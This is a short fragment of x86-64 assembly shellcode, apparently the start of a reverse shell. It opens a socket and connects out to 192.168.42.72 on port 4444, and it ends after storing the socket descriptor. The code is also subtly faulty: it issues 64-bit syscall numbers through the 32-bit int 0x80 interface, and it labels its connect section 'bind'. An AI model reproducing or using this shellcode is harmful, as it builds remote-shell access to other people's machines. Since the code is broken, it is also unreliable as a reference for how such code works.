; socket syscall
xor rax, rax	; null out rax
mov rsi, rax	; null out rsi
push byte 0x2	; arguement AF_INET
pop rdi			; rdi = 0x2
inc rsi			; rsi -> SOCK_STREAM
push byte 0X29	; syscall number
pop rax
int 0X80		; run syscall socket

xchg rax, rdi 	; get the socket discriptor

; bind syscall
push 0x2		; AF_INET
push dword 0x482AA8C0
;address 192.168.42.72
mov word [rsp + 2], 0x5c11 ; port 4444 in network byte order
push rsp
pop rsi			; put the arguments into rsi

push rdx		; insert null onto stack. 
push byte 0x10	
pop rdx			; size 16 sockaddr
push byte 0x2a
pop rax			; syscall connect 42 
int 0x80


mov r9, rax		; store client socket fd
